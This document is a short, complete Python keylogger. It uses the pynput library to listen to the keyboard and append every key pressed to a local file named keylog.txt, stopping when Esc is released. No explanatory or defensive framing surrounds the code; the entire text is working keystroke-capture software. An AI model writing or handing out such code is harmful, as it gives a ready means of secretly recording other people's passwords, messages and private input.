import pynput
from pynput.keyboard import Key, Listener
import os
import time

# Set the log file path and name
log_file_path = "keylog.txt"

# Create the log file if it doesn't exist
if not os.path.exists(log_file_path):
    with open(log_file_path, "w") as f:
        f.write("Keylogger Log\n")

# Define a function to log keystrokes
def on_press(key):
    with open(log_file_path, "a") as f:
        f.write(f"{key}\n")

# Define a function to stop the keylogger
def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False

# Set up the keyboard listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
